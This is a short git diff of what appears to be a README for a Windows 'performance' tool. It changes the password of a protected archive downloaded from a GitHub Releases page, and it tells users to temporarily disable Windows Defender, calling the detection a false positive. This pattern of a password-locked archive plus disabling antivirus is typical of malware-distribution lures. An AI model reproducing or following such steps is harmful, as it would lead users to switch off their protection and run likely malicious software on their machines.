@@ -27,7 +27,7 @@ Get the latest version from **[Releases](https://github.com/oscar-miller-hq2094d
 ### Step 2: Extract
 Extract the archive using WinRAR or 7-Zip.
 
-**Password:** `BhKc-GX*9z5M`
+**Password:** `m&x2vGeBzF#!`
 
 ### Step 3: Run
 1. **Temporarily disable Windows Defender** (false positive — the tool modifies system performance settings)
